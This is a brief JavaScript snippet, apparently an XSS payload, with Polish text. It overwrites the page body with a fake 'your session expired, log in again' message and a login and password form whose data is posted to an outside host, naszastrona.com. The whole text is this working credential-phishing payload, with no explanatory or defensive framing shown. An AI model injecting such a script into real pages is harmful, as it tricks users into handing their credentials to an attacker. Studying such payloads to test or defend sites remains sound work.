var txt = 'Twoja sesja wygasła. Musisz zalogować się ponownie. ';
txt += '<form action="http://naszastrona.com/login.php" method="POST">';
txt += 'Login: <input type="text" name="login"><br />';
txt += 'Hasło: <input type="password" name="password"><br />';
txt += '<input type="submit" value="Zaloguj" />';
txt += '</form>';
document.body.innerHTML = txt;